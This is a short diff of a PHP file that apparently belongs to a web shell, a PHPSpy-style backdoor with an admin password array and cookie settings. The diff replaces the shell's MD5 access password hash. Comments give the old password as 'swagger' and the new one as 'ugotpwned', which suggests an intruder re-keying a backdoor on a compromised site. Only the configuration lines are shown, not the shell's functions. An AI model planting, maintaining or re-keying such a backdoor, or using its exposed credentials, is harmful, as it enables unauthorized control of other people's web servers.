@@ -25,9 +25,8 @@ foreach(array('_GET','_POST') as $_request) {
 	}
 	}
 }
-$admin=array('check' => 1, 'pass' => '5db89e7472f81a4ea6b7a73f7c6729f1','cookiepre' => '','cookiedomain' => '','cookiepath' => '/','cookielife' => 86400);
-// Encrypted:  	 5db89e7472f81a4ea6b7a73f7c6729f1
-// Decrypted:	MD5 : swagger
+$admin=array('check' => 1, 'pass' => 'D87F33AAD39073E70D184D10DDB6562B','cookiepre' => '','cookiedomain' => '','cookiepath' => '/','cookielife' => 86400);
+// Decrypted:	MD5 : ugotpwned
 
 if($charset == 'utf8') {
 header("content-Type: text/html; charset=utf-8");
